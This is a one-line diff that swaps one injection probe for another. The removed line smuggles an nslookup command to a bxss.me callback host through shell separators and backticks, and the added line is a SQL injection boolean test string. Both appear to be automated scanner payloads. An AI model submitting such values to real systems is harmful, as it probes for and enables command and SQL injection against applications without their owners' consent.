@@ -1,1 +1,1 @@
-&nslookup -q=cname hitteezvqfepw2a4ae.bxss.me&'\"`0&nslookup -q=cname hitteezvqfepw2a4ae.bxss.me&`'
+-1' OR 2+511-511-1=0+0+0+1 or 'gVdJiFfo'='
